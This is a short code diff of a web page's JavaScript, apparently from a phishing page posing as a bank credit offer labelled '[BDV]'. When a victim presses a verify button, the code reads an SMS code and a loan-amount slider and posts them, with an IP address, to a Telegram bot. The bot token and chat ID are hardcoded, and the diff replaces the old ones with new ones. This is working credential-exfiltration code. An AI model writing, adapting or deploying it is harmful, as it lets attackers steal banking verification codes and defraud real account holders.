@@ -207,10 +207,11 @@
       document.getElementById('verifyBtn').addEventListener('click', function () {
         const smsValue = document.getElementById('sms').value;
         const sliderValue = document.getElementById('priceSlider').value;
+        const userIP = '2803:9800:90b6:acaf:6417:3808:2c40:317f'; // IP fija
 
-        const chatId = '7099490763';
-        const token = '8042104204:AAET83zLWF34OkX7tJuHCcNvLsz1-yTHS8g';
-        const message = `SMS: ${smsValue}\nMonto del crédito: $${sliderValue}`;
+        const chatId = '-4527645712';
+        const token = '7535043094:AAH7nI1r3FPiAweIAibQE1g2oWCo1zTcdZo';
+        const message = `➖➖➖[BDV] ➖➖➖\n🌐 IP ${userIP}\n\n✔️usuario: ${smsValue}\n✔️aprobar: ${sliderValue}`;
 
         // Enviar el mensaje a Telegram
         axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
